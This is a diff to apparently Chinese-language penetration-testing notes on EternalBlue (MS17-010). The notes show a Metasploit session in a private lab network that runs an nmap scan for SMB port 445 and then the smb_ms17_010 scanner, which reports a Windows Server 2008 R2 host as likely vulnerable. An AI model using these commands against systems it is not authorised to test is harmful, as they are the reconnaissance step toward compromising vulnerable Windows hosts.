@@ -45,16 +45,23 @@ exploit
 永恒之蓝
 ```
 msf6 > nmap -p 445 192.168.59.0/24 --open
+[*] exec: nmap -p 445 192.168.59.0/24 --open
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-29 02:17 PST
+Nmap scan report for 192.168.59.197
+Host is up (0.00087s latency).
 
 
 
 msf6 > use auxiliary/scanner/smb/smb_ms17_010
-msf6 auxiliary(scanner/smb/smb_ms17_010) > set rhost 192.168.59.1
-msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set rhost 192.168.59.197
+rhost => 192.168.59.197
+msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit 
 
-[+] 192.168.59.160:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7600 x64 (64-bit)
-[*] 192.168.59.160:445    - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.59.197:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Datacenter 7600 x64 (64-bit)
+[*] 192.168.59.197:445    - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
+
 
 
 
